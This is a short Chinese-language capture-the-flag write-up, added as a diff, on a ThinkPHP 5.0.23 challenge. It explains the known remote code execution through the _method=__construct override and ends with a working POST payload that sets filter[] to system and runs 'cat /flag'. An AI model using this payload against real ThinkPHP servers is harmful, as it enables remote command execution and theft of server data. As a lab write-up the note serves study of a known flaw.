@@ -1,0 +1,14 @@
+RCE
+提示是thinkphp
+老漏洞大户了
+
+/?s=n使得其报错
+查看thinkphp版本为5.0.23
+
+baidu发现存在rce
+即当$_POST['_method']=__construct时，request类的method方法会将对该类的变量进行覆盖，当filter覆盖为函数名时，会造成rce
+
+即filter[REQUEST_METHOD]
+变为system([REQUEST_METHOD])
+
+_method=construct&filter[]=system&server[REQUEST_METHOD]=cat /flag
